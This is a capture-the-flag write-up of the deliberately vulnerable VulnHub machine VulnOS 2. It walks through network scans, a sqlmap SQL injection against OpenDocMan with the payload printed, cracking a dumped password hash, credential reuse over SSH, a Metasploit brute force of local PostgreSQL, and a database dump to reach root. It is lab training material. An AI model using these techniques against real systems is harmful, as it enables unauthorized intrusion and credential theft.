## VulnOS 2 VulnHub Writeup

1. Service discovery
2. http
3. OpenDocMan
4. She sells sea shells by to sea shore
5. webmin
6. Quiet - we're hunting services
7. vulnosadmin
8. Conclusion

After a rather long hiatus, I've decided to get back in to creating write ups for VulnHub images, and CTFs (that I take part in). Without further ado, I'm going to start where I left off - with [VulnOS 2](https://www.vulnhub.com/entry/vulnos-2,147/) by Ayan Ali.

### Service discovery

In order to find the host on the network, I use `netdiscover`.

```js
root@kali:~# netdiscover -i eth1 -r 192.168.110.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                         

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                       
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.110.1   0a:00:27:00:00:04      1      60  Unknown vendor                                                                                      
 192.168.110.100 08:00:27:a2:55:b4      1      60  Cadmus Computer Systems                                                                             
 192.168.110.102 08:00:27:57:4f:aa      1      60  Cadmus Computer Systems
```

Great, there's our target - `192.168.110.102`. Next, the `nmap` scan.

```js
root@kali:~# nmap -T4 -A -v -p0-65535 192.168.110.102

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-07 03:17 EDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Initiating ARP Ping Scan at 03:17
Scanning 192.168.110.102 [1 port]
Completed ARP Ping Scan at 03:17, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:17
Completed Parallel DNS resolution of 1 host. at 03:17, 0.02s elapsed
Initiating SYN Stealth Scan at 03:17
Scanning 192.168.110.102 [65536 ports]
Discovered open port 22/tcp on 192.168.110.102
Discovered open port 80/tcp on 192.168.110.102
Discovered open port 6667/tcp on 192.168.110.102
Completed SYN Stealth Scan at 03:17, 4.08s elapsed (65536 total ports)
Initiating Service scan at 03:17
Scanning 3 services on 192.168.110.102
Completed Service scan at 03:18, 11.02s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.110.102
NSE: Script scanning 192.168.110.102.
Initiating NSE at 03:18
Completed NSE at 03:19, 60.40s elapsed
Initiating NSE at 03:19
Completed NSE at 03:19, 0.00s elapsed
Nmap scan report for 192.168.110.102
Host is up (0.00037s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Uptime guess: 0.001 days (since Wed Sep  7 03:17:15 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.110.102

NSE: Script Post-scanning.
Initiating NSE at 03:19
Completed NSE at 03:19, 0.00s elapsed
Initiating NSE at 03:19
Completed NSE at 03:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.10 seconds
           Raw packets sent: 65636 (2.889MB) | Rcvd: 65629 (2.626MB)
```

So we've got three ports open - `22`, `80` and `6667`. I quickly check `ssh`, just in case there's an interesting banner, but nothing comes up. Next is port `80`.

### http

Upon visiting the target in a browser, we find a description of the target, along with a link to the "company" website at the path `/jabc`.

I browse to the "company" website, and immediately recognise the site as being powered by `Drupal`.

After browsing through the site, I note a few interesting words from the products, and add them to a wordlist. Under the tab `Documentation`, I note some hidden content that leads to the path `/jabcd0cs`. This hidden content includes login credentials for the new path, of `guest` and `guest`.

### OpenDocMan

Moving on to the `/jabcd0cs` path, I note that this is powered by `OpenDocMan`, version `1.2.7`.

After searching on [https://www.exploit-db.com](https://www.exploit-db.com/), I come across a [report of multiple vulnerabilities](https://www.exploit-db.com/exploits/32075/) against this version, including an SQL Injection vector.

I fire up `sqlmap`, and check it out.

```js
root@kali:~# sqlmap --threads 10 --url "http://192.168.110.102/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user*"
         _
 ___ ___| |_____ ___ ___  {1.0.7.1#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 03:38:38

custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q]
[03:38:39] [INFO] testing connection to the target URL
[03:38:39] [INFO] heuristics detected web page charset 'ISO-8859-2'
[03:38:39] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[03:38:39] [INFO] testing if the target URL is stable
[03:38:40] [INFO] target URL is stable
[03:38:40] [INFO] testing if URI parameter '#1*' is dynamic
[03:38:40] [INFO] confirming that URI parameter '#1*' is dynamic
[03:38:40] [INFO] URI parameter '#1*' is dynamic
[03:38:40] [INFO] heuristics detected web page charset 'ascii'
[03:38:40] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[03:38:40] [INFO] testing for SQL injection on URI parameter '#1*'
[03:38:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:38:41] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[03:38:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:38:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:38:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
[03:38:42] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:38:42] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[03:38:42] [INFO] testing 'MySQL inline queries'
[03:38:42] [INFO] testing 'PostgreSQL inline queries'
[03:38:42] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[03:38:42] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[03:38:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:38:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:38:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:38:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[03:38:43] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[03:38:43] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
[03:38:43] [INFO] testing 'Oracle AND time-based blind'
[03:38:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[03:38:44] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
[03:38:44] [WARNING] reflective value(s) found and filtering out
[03:38:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:38:44] [INFO] target URL appears to have 9 columns in query
[03:38:44] [WARNING] applying generic concatenation with double pipes ('||')
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[03:38:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[03:38:54] [INFO] testing 'MySQL UNION query (53) - 1 to 10 columns'
[03:38:55] [INFO] heuristics detected web page charset 'windows-1252'
[03:38:55] [INFO] URI parameter '#1*' is 'MySQL UNION query (53) - 1 to 10 columns' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 359 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: MySQL UNION query (53) - 9 columns
    Payload: http://192.168.110.102:80/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION ALL SELECT 53,CONCAT(0x716a707871,0x617175686f6c6a70566c6c666d575a6e7a6c6169527265496f494f61544d6f75624c575364455265,0x7171706271),53,53,53,53,53,53,53#
---
[03:38:58] [INFO] testing MySQL
[03:38:58] [INFO] confirming MySQL
[03:38:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[03:38:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.102'

[*] shutting down at 03:38:58
```

Great! Time to check out the database.

After a little digging, we find the table that holds the login credentials for `OpenDocMan`. We find a second user named `webmin`, who holds administrative privileges.

```js
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
| id | phone       | Email              | username | password                         | last_name | first_name | department | pw_reset_code |
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
| 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b | min       | web        | 2          | <blank>       |
| 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 | guest     | guest      | 2          | NULL          |
+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+
```

Looks like an MD5 - after searching , we get a single hit for the word `webmin1980`. Great stuff.

After logging in, I actually start to explore the application.

### She sells sea shells by to sea shore

First thing that arrests my attention is the ability to add documents. Immediately I try to upload a simple PHP script that calls the function `phpinfo`. I'm met by the following error message.

I explore a little further, and find that as an administrative user, we're able to update the list of allowed mime types. Without hesitation, I add the type `text/x-php`.

I attempt to upload the test script, and this time am met by success.

Awesome! Let's try and view the script now.

Well shucks. The PHP script isn't actually executed. Investigating a bit further, I find that the upload directory is set as `/jabcd0cs/uploads`. I open this directory in the browser, but am met by a load of `.dat` files.

Doesn't look like we'll get code execution this way.

As we have a set of credentials, let's try them against the only other service we've got so far that accepts them - `ssh`.

```js
root@kali:~# ssh webmin@192.168.110.102
webmin@192.168.110.102's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Sep  7 09:12:16 CEST 2016

  System load: 0.0               Memory usage: 2%   Processes:       63
  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  4 10:41:07 2016
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
```

Boo-ya!

### webmin

Immediately I check to see if we can run any commands with `sudo`.

```js
$ sudo -l
[sudo] password for webmin:
Sorry, user webmin may not run sudo on VulnOSv2.
```

No dice. What's in the home directory for the `webmin` user?

```js
$ ls -lah
total 596K
drwxr-x--- 3 webmin webmin 4.0K May  3 19:26 .
drwxr-xr-x 4 root   root   4.0K Apr 16 15:09 ..
-rw------- 1 webmin webmin   85 May  4 10:42 .bash_history
-rw-r--r-- 1 webmin webmin  220 Apr  9  2014 .bash_logout
-rw-r--r-- 1 webmin webmin 3.6K Apr  9  2014 .bashrc
drwx------ 2 webmin webmin 4.0K Apr 30 17:06 .cache
-rw-rw-r-- 1 webmin webmin 566K Apr 30 15:25 post.tar.gz
-rw-r--r-- 1 webmin webmin  675 Apr  9  2014 .profile
```

A file named `post.tar.gz` looks interesting. I also note that there is some content in the `.bash_history` file. I inspect this before moving on.

```js
$ cat .bash_history
cd /home
cd vulnosadmin
ls -l
cd
ifconfig
exit
cd /home
cd vulnosadmin
ifconfig
exit
```

This reveals another user named `vulnosadmin`, and shows that the `webmin` user has previously checked out the content of their home directory. I try the same.

```js
$ ls -lah /home/vulnosadmin/
ls: cannot open directory /home/vulnosadmin/: Permission denied
```

Damn, the permissions must of been changed prior to the publishing of this image. I proceed to extract the file `post.tar.gz`, and we're presented with a copy of `hydra`, which suggests there may be a system we need to bruteforce a login for.

```js
$ tar zxvf post.tar.gz
post/hydra-smb.c
post/xhydra.1
post/hydra-smtp.c
post/crc32.h
post/hydra-gtk/ChangeLog
post/hydra-gtk/README
post/hydra-gtk/COPYING
post/hydra-oracle-listener.c
post/pw-inspector.ico
...
```

### Quiet - we're hunting services

I check out which services are listening locally.

```js
$ netstat -tul
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         *:*                     LISTEN     
tcp        0      0 *:ircd                  *:*                     LISTEN     
tcp        0      0 *:ssh                   *:*                     LISTEN     
tcp        0      0 localhost:postgresql    *:*                     LISTEN     
tcp6       0      0 [::]:ircd               [::]:*                  LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       0      0 localhost:postgresql    [::]:*                  LISTEN     
udp        0      0 *:bootpc                *:*                                
udp        0      0 *:43204                 *:*                                
udp6       0      0 [::]:8345               [::]:*
```

So we've got `postgresql` and `mysql` running locally.

Instead of using `hydra` on the machine, I forward port `5432` using `ssh`.

```js
root@kali:~# ssh webmin@192.168.110.102 -L 5432:localhost:5432
```

I then fire up the module `auxiliary/scanner/postgres/postgres_login` in `metasploit`, and run it against `localhost:5432`.

```js
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1

msf auxiliary(postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 127.0.0.1:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[+] 127.0.0.1:5432 - LOGIN SUCCESSFUL: postgres:postgres@template1
[-] 127.0.0.1:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Great, we've got a hit for the username and password of `postres`. I use `pg_dumpall` to extract all the databases that we have access to.

```js
root@kali:~# PGPASSWORD="postgres" pg_dumpall -U postgres -h localhost -p 5432
--
-- PostgreSQL database cluster dump
--

SET default_transaction_read_only = off;

SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;

--
-- Roles
--

CREATE ROLE postgres;
ALTER ROLE postgres WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN REPLICATION NOBYPASSRLS PASSWORD 'md53175bce1d3201d16594cebf9d7eb3f9d';






--
-- Database creation
--

CREATE DATABASE system WITH TEMPLATE = template0 OWNER = postgres;
REVOKE ALL ON DATABASE system FROM PUBLIC;
REVOKE ALL ON DATABASE system FROM postgres;
GRANT ALL ON DATABASE system TO postgres;
GRANT ALL ON DATABASE system TO PUBLIC;
REVOKE ALL ON DATABASE template1 FROM PUBLIC;
REVOKE ALL ON DATABASE template1 FROM postgres;
GRANT ALL ON DATABASE template1 TO postgres;
GRANT CONNECT ON DATABASE template1 TO PUBLIC;


\connect postgres

SET default_transaction_read_only = off;

--
-- PostgreSQL database dump
--

-- Dumped from database version 9.3.11
-- Dumped by pg_dump version 9.5.3

SET statement_timeout = 0;
SET lock_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: postgres; Type: COMMENT; Schema: -; Owner: postgres
--

COMMENT ON DATABASE postgres IS 'default administrative connection database';


--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner:
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner:
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


--
-- Name: public; Type: ACL; Schema: -; Owner: postgres
--

REVOKE ALL ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM postgres;
GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- PostgreSQL database dump complete
--

\connect system

SET default_transaction_read_only = off;

--
-- PostgreSQL database dump
--

-- Dumped from database version 9.3.11
-- Dumped by pg_dump version 9.5.3

SET statement_timeout = 0;
SET lock_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: system; Type: COMMENT; Schema: -; Owner: postgres
--

COMMENT ON DATABASE system IS 'Just Another System DB';


--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner:
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner:
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


SET search_path = public, pg_catalog;

SET default_tablespace = '';

SET default_with_oids = false;

--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE users (
    "ID" integer NOT NULL,
    username text,
    password text
);


ALTER TABLE users OWNER TO postgres;

--
-- Name: TABLE users; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON TABLE users IS 'Just Another Users table';


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY users ("ID", username, password) FROM stdin;
1    vulnosadmin    c4nuh4ckm3tw1c3
\.


--
-- Name: users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY users
    ADD CONSTRAINT users_pkey PRIMARY KEY ("ID");


--
-- Name: public; Type: ACL; Schema: -; Owner: postgres
--

REVOKE ALL ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM postgres;
GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- PostgreSQL database dump complete
--

\connect template1

SET default_transaction_read_only = off;

--
-- PostgreSQL database dump
--

-- Dumped from database version 9.3.11
-- Dumped by pg_dump version 9.5.3

SET statement_timeout = 0;
SET lock_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET row_security = off;

--
-- Name: template1; Type: COMMENT; Schema: -; Owner: postgres
--

COMMENT ON DATABASE template1 IS 'default template for new databases';


--
-- Name: plpgsql; Type: EXTENSION; Schema: -; Owner:
--

CREATE EXTENSION IF NOT EXISTS plpgsql WITH SCHEMA pg_catalog;


--
-- Name: EXTENSION plpgsql; Type: COMMENT; Schema: -; Owner:
--

COMMENT ON EXTENSION plpgsql IS 'PL/pgSQL procedural language';


--
-- Name: public; Type: ACL; Schema: -; Owner: postgres
--

REVOKE ALL ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM postgres;
GRANT ALL ON SCHEMA public TO postgres;
GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- PostgreSQL database dump complete
--

--
-- PostgreSQL database cluster dump complete
--
```

After searching through this dump, I find something of interest.

```js
CREATE TABLE users (
    "ID" integer NOT NULL,
    username text,
    password text
);


ALTER TABLE users OWNER TO postgres;

--
-- Name: TABLE users; Type: COMMENT; Schema: public; Owner: postgres
--

COMMENT ON TABLE users IS 'Just Another Users table';


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY users ("ID", username, password) FROM stdin;
1    vulnosadmin    c4nuh4ckm3tw1c3
\.
```

Let's give this password a go against the local `vulnosadmin` user, using `su`.

```js
$ su vulnosadmin
Password:
vulnosadmin@VulnOSv2:/home/webmin$ id
uid=1000(vulnosadmin) gid=1000(vulnosadmin) groups=1000(vulnosadmin),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

Nice!

### vulnosadmin

Firstly I check to see if we can run any commands with `sudo`. Again, no dice.

I then `cd` in to the home directory for the `vulnosadmin` user, and have a poke around.

```js
vulnosadmin@VulnOSv2:~$ ls -lah
total 476K
drwxr-x--- 3 vulnosadmin vulnosadmin 4.0K May  4 19:35 .
drwxr-xr-x 4 root        root        4.0K Apr 16 15:09 ..
-rw------- 1 vulnosadmin vulnosadmin 4.8K May  4 19:36 .bash_history
-rw-r--r-- 1 vulnosadmin vulnosadmin  220 Apr  3 18:14 .bash_logout
-rw-r--r-- 1 vulnosadmin vulnosadmin 3.6K Apr  3 18:14 .bashrc
drwx------ 2 vulnosadmin vulnosadmin 4.0K Apr  3 18:17 .cache
-rw-r--r-- 1 vulnosadmin vulnosadmin  675 Apr  3 18:14 .profile
-rw-rw-r-- 1 vulnosadmin vulnosadmin 439K May  4 18:41 r00t.blend
-rw------- 1 root        root        1.5K May  2 18:51 .viminfo
```

I checked out the `.bash_history` again, but not much of interest was in there. We have one more file of interest - `r00t.blend`. This is a blender file. I install blender on my kali machine, copy the file to the web root and download it to my kali machine, and then open it.

Let's get rid of that cheeky little cube.

Better..a little bit of rotation?

Looks like a password to me - `ab12fg//drg`. Let's give it a go.

```js
root@kali:~# ssh root@192.168.110.102
root@192.168.110.102's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Sep  7 10:12:04 CEST 2016

  System load:  0.0               Processes:           90
  Usage of /:   5.8% of 29.91GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 192.168.110.102
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  4 19:36:39 2016
root@VulnOSv2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Time to get the flag.

```js
root@VulnOSv2:~# ls -lah
total 36K
drwx------  3 root root 4.0K May  4 19:37 .
drwxr-xr-x 21 root root 4.0K Apr  3 18:06 ..
-rw-------  1 root root    9 May  4 19:37 .bash_history
-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
drwx------  2 root root 4.0K May  2 18:55 .cache
-rw-r--r--  1 root root  165 May  4 19:06 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root    3 May  2 19:01 .psql_history
-rw-------  1 root root  735 May  4 19:06 .viminfo
root@VulnOSv2:~# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

### Conclusion

This was a nice machine, and a gentle reintroduction to VulnHub. for the challenge, and of course thank you to [VulnHub](https://www.vulnhub.com/) for hosting it.
